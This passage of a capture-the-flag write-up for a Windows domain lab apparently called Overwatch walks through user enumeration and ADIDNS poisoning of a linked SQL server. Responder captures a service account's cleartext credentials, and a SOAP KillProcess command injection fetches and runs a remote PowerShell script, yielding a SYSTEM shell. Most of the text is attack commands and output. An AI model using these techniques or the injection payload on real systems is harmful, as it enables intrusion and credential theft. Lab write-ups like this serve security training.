LDAP        10.129.12.9     389    S200401          Georgina.Chambers             2025-05-17 03:05:51 0                                                                    
LDAP        10.129.12.9     389    S200401          Philip.Harris                 2025-05-17 03:05:51 0                                                                    
LDAP        10.129.12.9     389    S200401          Samantha.Scott                2025-05-17 03:05:51 0                                                                    
LDAP        10.129.12.9     389    S200401          Ann.Hill                      2025-05-17 03:05:51 0                                                                    
LDAP        10.129.12.9     389    S200401          Chloe.Cox                     2025-05-17 03:05:51 0                                                                    
LDAP        10.129.12.9     389    S200401          Jamie.Gough                   2025-05-17 03:05:52 0                                                                    
LDAP        10.129.12.9     389    S200401          Frederick.Hussain             2025-05-17 03:05:52 0                                                                    
LDAP        10.129.12.9     389    S200401          Dean.Hobbs                    2025-05-17 03:05:52 0                                                                    
LDAP        10.129.12.9     389    S200401          Danielle.Moore                2025-05-17 03:05:52 0                                                                    
LDAP        10.129.12.9     389    S200401          Timothy.Smith                 2025-05-17 03:05:52 0                                                                    
LDAP        10.129.12.9     389    S200401          Declan.Stone                  2025-05-17 03:05:52 0                                                                    
LDAP        10.129.12.9     389    S200401          Jacob.Wilson                  2025-05-17 03:05:52 0                                                                    
LDAP        10.129.12.9     389    S200401          Gary.Elliott                  2025-05-17 03:05:52 0                                                                    
LDAP        10.129.12.9     389    S200401          Peter.Slater                  2025-05-17 03:05:53 0                                                                    
LDAP        10.129.12.9     389    S200401          Louise.Walton                 2025-05-17 03:05:53 0                                                                    
LDAP        10.129.12.9     389    S200401          Brett.Haynes                  2025-05-17 03:05:53 0                                                                    
LDAP        10.129.12.9     389    S200401          Elliot.Green                  2025-05-17 03:05:53 0                                                                    
LDAP        10.129.12.9     389    S200401          Wendy.Williams                2025-05-17 03:05:53 0                                                                    
LDAP        10.129.12.9     389    S200401          Graham.Parker                 2025-05-17 03:05:53 0                                                                    
LDAP        10.129.12.9     389    S200401          Abdul.Stevens                 2025-05-17 03:05:53 0                                                                    
LDAP        10.129.12.9     389    S200401          Brett.Bailey                  2025-05-17 03:05:54 0                                                                    
LDAP        10.129.12.9     389    S200401          Benjamin.Harrison             2025-05-17 03:05:54 0                                                                    
LDAP        10.129.12.9     389    S200401          Emily.Cooper                  2025-05-17 03:05:54 0                                                                    
LDAP        10.129.12.9     389    S200401          Roger.Spencer                 2025-05-17 03:05:54 0                                                                    
LDAP        10.129.12.9     389    S200401          [*] Writing 105 local users to users.txt
```

Connecting to the `mssqlservice` instance we see that we're not a `sysadmin`.
```bash
$ mssqlclient.py overwatch.htb/sqlsvc:[REDACTED]@10.129.12.9 -port 6520 -windows-auth
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(S200401\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(S200401\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2022 RTM (16.0.1000)
[!] Press help for extra shell commands
SQL (OVERWATCH\sqlsvc  guest@master)> SELECT IS_SRVROLEMEMBER('sysadmin');
    
-   
0  
```

Looking around however we can find linked servers.
```sql
SQL (OVERWATCH\sqlsvc  guest@master)> EXEC sp_linkedservers;                                                                       
SRV_NAME             SRV_PROVIDERNAME   SRV_PRODUCT   SRV_DATASOURCE       SRV_PROVIDERSTRING   SRV_LOCATION   SRV_CAT   
------------------   ----------------   -----------   ------------------   ------------------   ------------   -------
S200401\SQLEXPRESS   SQLNCLI            SQL Server    S200401\SQLEXPRESS   NULL                 NULL           NULL
SQL07                SQLNCLI            SQL Server    SQL07                NULL                 NULL           NULL
```

Taking a look at our `writables` it seems we have `create child` under the `MicrosoftDNS`.
```bash
$ bloodyAD -d overwatch.htb -H S200401.overwatch.htb -u 'sqlsvc' -p "$PASS" get writable 

distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=overwatch,DC=htb
permission: WRITE

distinguishedName: CN=sqlsvc,CN=Users,DC=overwatch,DC=htb
permission: WRITE

distinguishedName: DC=overwatch.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=overwatch,DC=htb
permission: CREATE_CHILD

distinguishedName: DC=_msdcs.overwatch.htb,CN=MicrosoftDNS,DC=ForestDnsZones,DC=overwatch,DC=htb
permission: CREATE_CHILD
```

Actually if we take a deeper look at the `MicrosoftDNS` object we can find that **all authenticated users.** can **CREATE_CHILD** which means that all authenticated users can edit the DNS as long as they're not a GUEST user.
```bash
$ bloodyAD -d overwatch.htb -H S200401.overwatch.htb -u 'sqlsvc' -p "$PASS" get object "DC=_msdcs.overwatch.htb,CN=MicrosoftDNS,DC=ForestDnsZones,DC=overwatch,DC=htb" --attr nTSecurityDescriptor --resolve-sd

distinguishedName: DC=_msdcs.overwatch.htb,CN=MicrosoftDNS,DC=ForestDnsZones,DC=overwatch,DC=htb
nTSecurityDescriptor.Owner: LOCAL_SYSTEM
nTSecurityDescriptor.Control: DACL_AUTO_INHERITED|DACL_PRESENT|SACL_AUTO_INHERITED|SELF_RELATIVE
nTSecurityDescriptor.ACL.0.Type: == ALLOWED ==
nTSecurityDescriptor.ACL.0.Trustee: Domain Admins; LOCAL_SYSTEM
nTSecurityDescriptor.ACL.0.Right: GENERIC_ALL
nTSecurityDescriptor.ACL.0.ObjectType: Self
nTSecurityDescriptor.ACL.1.Type: == ALLOWED ==
nTSecurityDescriptor.ACL.1.Trustee: AUTHENTICATED_USERS
nTSecurityDescriptor.ACL.1.Right: CREATE_CHILD
nTSecurityDescriptor.ACL.1.ObjectType: Self
nTSecurityDescriptor.ACL.2.Type: == ALLOWED ==
nTSecurityDescriptor.ACL.2.Trustee: EVERYONE
nTSecurityDescriptor.ACL.2.Right: GENERIC_READ
nTSecurityDescriptor.ACL.2.ObjectType: Self
nTSecurityDescriptor.ACL.3.Type: == ALLOWED ==
nTSecurityDescriptor.ACL.3.Trustee: ENTERPRISE_DOMAIN_CONTROLLERS
nTSecurityDescriptor.ACL.3.Right: WRITE_OWNER|WRITE_DACL|GENERIC_WRITE|DELETE|CONTROL_ACCESS|DELETE_TREE|READ_PROP|LIST_CHILD|DELETE_CHILD|CREATE_CHILD
nTSecurityDescriptor.ACL.3.ObjectType: Self
nTSecurityDescriptor.ACL.3.Flags: CONTAINER_INHERIT; INHERITED
nTSecurityDescriptor.ACL.4.Type: == ALLOWED_OBJECT ==
nTSecurityDescriptor.ACL.4.Trustee: ALIAS_PREW2KCOMPACC
nTSecurityDescriptor.ACL.4.Right: READ_PROP
nTSecurityDescriptor.ACL.4.ObjectType: Remote-Access-Information (property set); Logon-Information (property set); Account-Restrictions (property set); General-Information (property set); Group-Membership (property set)
nTSecurityDescriptor.ACL.4.InheritedObjectType: inetOrgPerson; User
nTSecurityDescriptor.ACL.4.Flags: CONTAINER_INHERIT; INHERIT_ONLY; INHERITED
nTSecurityDescriptor.ACL.5.Type: == ALLOWED_OBJECT ==
nTSecurityDescriptor.ACL.5.Trustee: CREATOR_OWNER; PRINCIPAL_SELF
nTSecurityDescriptor.ACL.5.Right: WRITE_VALIDATED
nTSecurityDescriptor.ACL.5.ObjectType: DS-Validated-Write-Computer
nTSecurityDescriptor.ACL.5.InheritedObjectType: Computer
nTSecurityDescriptor.ACL.5.Flags: CONTAINER_INHERIT; INHERIT_ONLY; INHERITED
nTSecurityDescriptor.ACL.6.Type: == ALLOWED_OBJECT ==
nTSecurityDescriptor.ACL.6.Trustee: ENTERPRISE_DOMAIN_CONTROLLERS
nTSecurityDescriptor.ACL.6.Right: READ_PROP
nTSecurityDescriptor.ACL.6.ObjectType: Token-Groups
nTSecurityDescriptor.ACL.6.InheritedObjectType: Computer; Group; User
nTSecurityDescriptor.ACL.6.Flags: CONTAINER_INHERIT; INHERIT_ONLY; INHERITED
nTSecurityDescriptor.ACL.7.Type: == ALLOWED_OBJECT ==
nTSecurityDescriptor.ACL.7.Trustee: PRINCIPAL_SELF
nTSecurityDescriptor.ACL.7.Right: WRITE_PROP
nTSecurityDescriptor.ACL.7.ObjectType: ms-TPM-Tpm-Information-For-Computer
nTSecurityDescriptor.ACL.7.InheritedObjectType: Computer
nTSecurityDescriptor.ACL.7.Flags: CONTAINER_INHERIT; INHERIT_ONLY; INHERITED
nTSecurityDescriptor.ACL.8.Type: == ALLOWED_OBJECT ==
nTSecurityDescriptor.ACL.8.Trustee: ALIAS_PREW2KCOMPACC
nTSecurityDescriptor.ACL.8.Right: GENERIC_READ
nTSecurityDescriptor.ACL.8.ObjectType: Self
nTSecurityDescriptor.ACL.8.InheritedObjectType: inetOrgPerson; Group; User
nTSecurityDescriptor.ACL.8.Flags: CONTAINER_INHERIT; INHERIT_ONLY; INHERITED
nTSecurityDescriptor.ACL.9.Type: == ALLOWED_OBJECT ==
nTSecurityDescriptor.ACL.9.Trustee: PRINCIPAL_SELF
nTSecurityDescriptor.ACL.9.Right: WRITE_PROP|READ_PROP
nTSecurityDescriptor.ACL.9.ObjectType: ms-DS-Allowed-To-Act-On-Behalf-Of-Other-Identity
nTSecurityDescriptor.ACL.9.Flags: CONTAINER_INHERIT; INHERITED; OBJECT_INHERIT
nTSecurityDescriptor.ACL.10.Type: == ALLOWED_OBJECT ==
nTSecurityDescriptor.ACL.10.Trustee: PRINCIPAL_SELF
nTSecurityDescriptor.ACL.10.Right: CONTROL_ACCESS|WRITE_PROP|READ_PROP
nTSecurityDescriptor.ACL.10.ObjectType: Private-Information (property set)
nTSecurityDescriptor.ACL.10.Flags: CONTAINER_INHERIT; INHERITED
nTSecurityDescriptor.ACL.11.Type: == ALLOWED ==
nTSecurityDescriptor.ACL.11.Trustee: Enterprise Admins
nTSecurityDescriptor.ACL.11.Right: GENERIC_ALL
nTSecurityDescriptor.ACL.11.ObjectType: Self
nTSecurityDescriptor.ACL.11.Flags: CONTAINER_INHERIT; INHERITED
nTSecurityDescriptor.ACL.12.Type: == ALLOWED ==
nTSecurityDescriptor.ACL.12.Trustee: ALIAS_PREW2KCOMPACC
nTSecurityDescriptor.ACL.12.Right: LIST_CHILD
nTSecurityDescriptor.ACL.12.ObjectType: Self
nTSecurityDescriptor.ACL.12.Flags: CONTAINER_INHERIT; INHERITED
nTSecurityDescriptor.ACL.13.Type: == ALLOWED ==
nTSecurityDescriptor.ACL.13.Trustee: BUILTIN_ADMINISTRATORS
nTSecurityDescriptor.ACL.13.Right: WRITE_OWNER|WRITE_DACL|GENERIC_READ|DELETE|CONTROL_ACCESS|WRITE_PROP|WRITE_VALIDATED|CREATE_CHILD
```

We can conduct `ADIDNS` poisoning pointing all users to our machine if they wish to connect to `SQL07`.
```bash
$ dnstool -u 'overwatch.htb\sqlsvc' -p "$PASS" -a add -r 'SQL07' -d '10.10.14.117' 10.129.12.9
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[-] Adding new record
[+] LDAP operation completed successfully
$ dnstool -u 'overwatch.htb\sqlsvc' -p "$PASS" -a query -r 'SQL07' 10.129.12.9
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[+] Found record SQL07
DC=SQL07,DC=overwatch.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=overwatch,DC=htb
[+] Record entry:
 - Type: 1 (A) (Serial: 613)
 - Address: 10.10.14.11
```

Let's start up responder as well to catch any authentications.
```bash
$ sudo responder -I tun0 -v                      
[sudo] password for kasm-user: 
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    MQTT server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]
    SNMP server                [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.14.117]
    Responder IPv6             [dead:beef:2::1073]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']
    Don't Respond To MDNS TLD  ['_DOSVC']
    TTL for poisoned response  [default]

[+] Current Session Variables:
    Responder Machine Name     [WIN-8NGHWVSUGGD]
    Responder Domain Name      [1VI7.LOCAL]
    Responder DCE-RPC Port     [46811]

[*] Version: Responder 3.1.7.0
[*] Author: Laurent Gaffie, <lgaffie@secorizon.com>
[*] To sponsor Responder: https://paypal.me/PythonResponder

[+] Listening for events...



```

Now let's attempt to send a query to the linked server.
```bash
SQL (OVERWATCH\sqlsvc  guest@master)> SELECT * FROM OPENQUERY("SQL07", 'SELECT 1');
INFO(S200401\SQLEXPRESS): Line 1: OLE DB provider "MSOLEDBSQL" for linked server "SQL07" returned message "Communication link failure".
ERROR(MSOLEDBSQL): Line 0: TCP Provider: An existing connection was forcibly closed by the remote host.
```

Looking back at our `responder` output we get a connection!
```bash
[MSSQL] Received connection from 10.129.12.9
[MSSQL] Cleartext Client   : 10.129.12.9
[MSSQL] Cleartext Hostname : SQL07 ()
[MSSQL] Cleartext Username : sqlmgmt
[MSSQL] Cleartext Password : [REDACTED]
```

`sqlmgmt` is a member of `remote management users` which means we can `winrm`
```bash
$ nxc ldap overwatch.htb -u 'sqlmgmt' -p "$PASS" -M whoami
LDAP        10.129.12.9     389    S200401          [*] Windows Server 2022 Build 20348 (name:S200401) (domain:overwatch.htb) (signing:None) (channel binding:No TLS cert) 
LDAP        10.129.12.9     389    S200401          [+] overwatch.htb\sqlmgmt:[REDACTED] 
WHOAMI      10.129.12.9     389    S200401          Name: sqlmgmt
WHOAMI      10.129.12.9     389    S200401          sAMAccountName: sqlmgmt
WHOAMI      10.129.12.9     389    S200401          Enabled: Yes
WHOAMI      10.129.12.9     389    S200401          Password Never Expires: Yes
WHOAMI      10.129.12.9     389    S200401          User Principal Name: sqlmgmt@overwatch.htb
WHOAMI      10.129.12.9     389    S200401          Last logon: Never
WHOAMI      10.129.12.9     389    S200401          Password Last Set: 2025-05-17 01:24:21 UTC
WHOAMI      10.129.12.9     389    S200401          Bad Password Count: 0
WHOAMI      10.129.12.9     389    S200401          Distinguished Name: CN=sqlmgmt,CN=Users,DC=overwatch,DC=htb
WHOAMI      10.129.12.9     389    S200401          Member of: CN=Remote Management Users,CN=Builtin,DC=overwatch,DC=htb
WHOAMI      10.129.12.9     389    S200401          User SID: S-1-5-21-2797066498-1365161904-233915892-1105

$ evil-winrm overwatch.htb -u 'sqlmgmt' -p "$PASS"
                                        
Evil-WinRM shell v3.9
                                        
Error: missing argument: ip

Usage: evil-winrm -i IP -u USER [-s SCRIPTS_PATH] [-e EXES_PATH] [-P PORT] [-a USERAGENT] [-p PASS] [-H HASH] [-U URL] [-S] [-c PUBLIC_KEY_PATH ] [-k PRIVATE_KEY_PATH ] [-r REALM] [-K TICKET_FILE] [--spn SPN_PREFIX] [-l]
    -S, --ssl                        Enable ssl
    -c, --pub-key PUBLIC_KEY_PATH    Local path to public key certificate
    -k, --priv-key PRIVATE_KEY_PATH  Local path to private key certificate
    -r, --realm DOMAIN               Kerberos auth, it has to be set also in /etc/krb5.conf file using this format -> CONTOSO.COM = { kdc = fooserver.contoso.com }
    -s, --scripts PS_SCRIPTS_PATH    Powershell scripts local path
        --spn SPN_PREFIX             SPN prefix for Kerberos auth (default HTTP)
    -K, --ccache TICKET_FILE         Path to Kerberos ticket file (ccache or kirbi format, auto-detected)
    -e, --executables EXES_PATH      C# executables local path
    -i, --ip IP                      Remote host IP or hostname. FQDN for Kerberos auth (required)
    -U, --url URL                    Remote url endpoint (default /wsman)
    -u, --user USER                  Username (required if not using kerberos)
    -p, --password PASS              Password
    -H, --hash HASH                  NTHash
    -P, --port PORT                  Remote host port (default 5985)
    -a, --user-agent USERAGENT       Specify connection user-agent (default Microsoft WinRM Client)
    -V, --version                    Show version
    -n, --no-colors                  Disable colors
    -N, --no-rpath-completion        Disable remote path completion
    -l, --log                        Log the WinRM session
    -h, --help                       Display this help message
                                                                                                                                                                                                                                                                       
$ evil-winrm -i overwatch.htb -u 'sqlmgmt' -p "$PASS"
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc` for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\sqlmgmt\Documents> ls
*Evil-WinRM* PS C:\Users\sqlmgmt\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\sqlmgmt\Desktop> ls


    Directory: C:\Users\sqlmgmt\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-ar---         1/22/2026   6:17 AM             34 user.txt
```

Just like that, we have User!
# Root
## Monitoring Service Exploitation
Taking a look around we can find port `8000` listening, just as the `config` file specified it would be.
```Powershell
*Evil-WinRM* PS C:\> netstat -ano | findstr :8000                                                                                  
  TCP    0.0.0.0:8000           0.0.0.0:0              LISTENING       4                                       
  TCP    [::]:8000              [::]:0                 LISTENING       4
```

Forwarding the port and visiting the service we can find the `monitor service` page with some instructions.
![Monitoring Service Service](/assets/img/img_overwatch/overwatch-1769302483401.png)

Looking at the service description we can find some interesting operations. Specifically the `KillProcess` string.
```xml
<wsdl:definitions name="MonitoringService" targetNamespace="http://tempuri.org/">
<wsdl:types>
<xs:schema elementFormDefault="qualified" targetNamespace="http://tempuri.org/">
<xs:element name="StartMonitoring">
<xs:complexType>
<xs:sequence/>
</xs:complexType>
</xs:element>
<xs:element name="StartMonitoringResponse">
<xs:complexType>
<xs:sequence>
<xs:element minOccurs="0" name="StartMonitoringResult" nillable="true" type="xs:string"/>
</xs:sequence>
</xs:complexType>
</xs:element>
<xs:element name="StopMonitoring">
<xs:complexType>
<xs:sequence/>
</xs:complexType>
</xs:element>
<xs:element name="StopMonitoringResponse">
<xs:complexType>
<xs:sequence>
<xs:element minOccurs="0" name="StopMonitoringResult" nillable="true" type="xs:string"/>
</xs:sequence>
</xs:complexType>
</xs:element>
<xs:element name="KillProcess">
<xs:complexType>
<xs:sequence>
<xs:element minOccurs="0" name="processName" nillable="true" type="xs:string"/>
</xs:sequence>
</xs:complexType>
</xs:element>
<xs:element name="KillProcessResponse">
<xs:complexType>
<xs:sequence>
<xs:element minOccurs="0" name="KillProcessResult" nillable="true" type="xs:string"/>
</xs:sequence>
</xs:complexType>
</xs:element>
</xs:schema>
<xs:schema attributeFormDefault="qualified" elementFormDefault="qualified" targetNamespace="http://schemas.microsoft.com/2003/10/Serialization/">
<xs:element name="anyType" nillable="true" type="xs:anyType"/>
<xs:element name="anyURI" nillable="true" type="xs:anyURI"/>
<xs:element name="base64Binary" nillable="true" type="xs:base64Binary"/>
<xs:element name="boolean" nillable="true" type="xs:boolean"/>
<xs:element name="byte" nillable="true" type="xs:byte"/>
<xs:element name="dateTime" nillable="true" type="xs:dateTime"/>
<xs:element name="decimal" nillable="true" type="xs:decimal"/>
<xs:element name="double" nillable="true" type="xs:double"/>
<xs:element name="float" nillable="true" type="xs:float"/>
<xs:element name="int" nillable="true" type="xs:int"/>
<xs:element name="long" nillable="true" type="xs:long"/>
<xs:element name="QName" nillable="true" type="xs:QName"/>
<xs:element name="short" nillable="true" type="xs:short"/>
<xs:element name="string" nillable="true" type="xs:string"/>
<xs:element name="unsignedByte" nillable="true" type="xs:unsignedByte"/>
<xs:element name="unsignedInt" nillable="true" type="xs:unsignedInt"/>
<xs:element name="unsignedLong" nillable="true" type="xs:unsignedLong"/>
<xs:element name="unsignedShort" nillable="true" type="xs:unsignedShort"/>
<xs:element name="char" nillable="true" type="tns:char"/>
<xs:simpleType name="char">
<xs:restriction base="xs:int"/>
</xs:simpleType>
<xs:element name="duration" nillable="true" type="tns:duration"/>
<xs:simpleType name="duration">
<xs:restriction base="xs:duration">
<xs:pattern value="\-?P(\d*D)?(T(\d*H)?(\d*M)?(\d*(\.\d*)?S)?)?"/>
<xs:minInclusive value="-P10675199DT2H48M5.4775808S"/>
<xs:maxInclusive value="P10675199DT2H48M5.4775807S"/>
</xs:restriction>
</xs:simpleType>
<xs:element name="guid" nillable="true" type="tns:guid"/>
<xs:simpleType name="guid">
<xs:restriction base="xs:string">
<xs:pattern value="[\da-fA-F]{8}-[\da-fA-F]{4}-[\da-fA-F]{4}-[\da-fA-F]{4}-[\da-fA-F]{12}"/>
</xs:restriction>
</xs:simpleType>
<xs:attribute name="FactoryType" type="xs:QName"/>
<xs:attribute name="Id" type="xs:ID"/>
<xs:attribute name="Ref" type="xs:IDREF"/>
</xs:schema>
</wsdl:types>
<wsdl:message name="IMonitoringService_StartMonitoring_InputMessage">
<wsdl:part name="parameters" element="tns:StartMonitoring"/>
</wsdl:message>
<wsdl:message name="IMonitoringService_StartMonitoring_OutputMessage">
<wsdl:part name="parameters" element="tns:StartMonitoringResponse"/>
</wsdl:message>
<wsdl:message name="IMonitoringService_StopMonitoring_InputMessage">
<wsdl:part name="parameters" element="tns:StopMonitoring"/>
</wsdl:message>
<wsdl:message name="IMonitoringService_StopMonitoring_OutputMessage">
<wsdl:part name="parameters" element="tns:StopMonitoringResponse"/>
</wsdl:message>
<wsdl:message name="IMonitoringService_KillProcess_InputMessage">
<wsdl:part name="parameters" element="tns:KillProcess"/>
</wsdl:message>
<wsdl:message name="IMonitoringService_KillProcess_OutputMessage">
<wsdl:part name="parameters" element="tns:KillProcessResponse"/>
</wsdl:message>
<wsdl:portType name="IMonitoringService">
<wsdl:operation name="StartMonitoring">
<wsdl:input wsaw:Action="http://tempuri.org/IMonitoringService/StartMonitoring" message="tns:IMonitoringService_StartMonitoring_InputMessage"/>
<wsdl:output wsaw:Action="http://tempuri.org/IMonitoringService/StartMonitoringResponse" message="tns:IMonitoringService_StartMonitoring_OutputMessage"/>
</wsdl:operation>
<wsdl:operation name="StopMonitoring">
<wsdl:input wsaw:Action="http://tempuri.org/IMonitoringService/StopMonitoring" message="tns:IMonitoringService_StopMonitoring_InputMessage"/>
<wsdl:output wsaw:Action="http://tempuri.org/IMonitoringService/StopMonitoringResponse" message="tns:IMonitoringService_StopMonitoring_OutputMessage"/>
</wsdl:operation>
<wsdl:operation name="KillProcess">
<wsdl:input wsaw:Action="http://tempuri.org/IMonitoringService/KillProcess" message="tns:IMonitoringService_KillProcess_InputMessage"/>
<wsdl:output wsaw:Action="http://tempuri.org/IMonitoringService/KillProcessResponse" message="tns:IMonitoringService_KillProcess_OutputMessage"/>
</wsdl:operation>
</wsdl:portType>
<wsdl:binding name="BasicHttpBinding_IMonitoringService" type="tns:IMonitoringService">
<soap:binding transport="http://schemas.xmlsoap.org/soap/http"/>
<wsdl:operation name="StartMonitoring">
<soap:operation soapAction="http://tempuri.org/IMonitoringService/StartMonitoring" style="document"/>
<wsdl:input>
<soap:body use="literal"/>
</wsdl:input>
<wsdl:output>
<soap:body use="literal"/>
</wsdl:output>
</wsdl:operation>
<wsdl:operation name="StopMonitoring">
<soap:operation soapAction="http://tempuri.org/IMonitoringService/StopMonitoring" style="document"/>
<wsdl:input>
<soap:body use="literal"/>
</wsdl:input>
<wsdl:output>
<soap:body use="literal"/>
</wsdl:output>
</wsdl:operation>
<wsdl:operation name="KillProcess">
<soap:operation soapAction="http://tempuri.org/IMonitoringService/KillProcess" style="document"/>
<wsdl:input>
<soap:body use="literal"/>
</wsdl:input>
<wsdl:output>
<soap:body use="literal"/>
</wsdl:output>
</wsdl:operation>
</wsdl:binding>
<wsdl:service name="MonitoringService">
<wsdl:port name="BasicHttpBinding_IMonitoringService" binding="tns:BasicHttpBinding_IMonitoringService">
<soap:address location="http://overwatch.htb:8000/MonitorService"/>
</wsdl:port>
</wsdl:service>
</wsdl:definitions>
```

The KillProcess operation is interesting because if we decompile `overwatch.exe` and locate `KillProcess` which takes in `processName` as a parameter we can see that it runs a `powershell command` without any sanitation on the `processName`

```cs
public String KillProcess(String processName)
	{
		String str;
		String psCommand = String.Concat("Stop-Process -Name ", processName, " -Force");
		try
		{
			Runspace runspace = RunspaceFactory.CreateRunspace();
			try
			{
				runspace.Open();
				Pipeline pipeline = runspace.CreatePipeline();
				try
				{
					pipeline.get_Commands().AddScript(psCommand);
					pipeline.get_Commands().Add("Out-String");
					Collection<PSObject> collection = pipeline.Invoke();
					runspace.Close();
					StringBuilder output = new StringBuilder();
					foreach (PSObject obj in collection)
					{
						output.AppendLine(obj.ToString());
					}
					str = output.ToString();
				}
				finally
				{
					if (pipeline != null)
					{
						pipeline.Dispose();
					}
				}
			}
			finally
			{
				if (runspace != null)
				{
					runspace.Dispose();
				}
			}
		}
		catch (Exception exception)
		{
			str = String.Concat("Error: ", exception.get_Message());
		}
		return str;
	}
```

Let's attempt to send an `RCE` using the `KillProcess` operation, first I'll write the `xml` file we'll be submitting to the service.
```xml
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tem="http://tempuri.org/">
   <soapenv:Header/>
   <soapenv:Body>
      <tem:KillProcess>
         <tem:processName>w1ld; powershell 'iex(iwr http://10.10.14.117:3232/ra.exe.ps1 -useb)';</tem:processName>
      </tem:KillProcess>
   </soapenv:Body>
</soapenv:Envelope>
```

Now I'll be sending it over to the service.
```bash
curl -X POST -H "Content-Type: text/xml; charset=utf-8" \
     -H "SOAPAction: http://tempuri.org/IMonitoringService/KillProcess" \
     -d @exploit.xml http://127.0.0.1:8000/MonitorService
```

I get a callback on my listener!
```bash
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Software\Monitoring> whoami
nt authority\system
PS C:\Software\Monitoring> cd C:\Users\Administrator\Desktop
PS C:\Users\Administrator\Desktop> ls


    Directory: C:\Users\Administrator\Desktop


Mode                 LastWriteTime         Length Name                                                                                                                                                                                                                
----                 -------------         ------ ----                                                                                                                                                                                                                
-a----         5/16/2025   5:00 PM           2308 Microsoft Edge.lnk                                                                                                                                                                                                  
-ar---         1/22/2026   6:17 AM             34 root.txt  
```

Just like that, we have Root!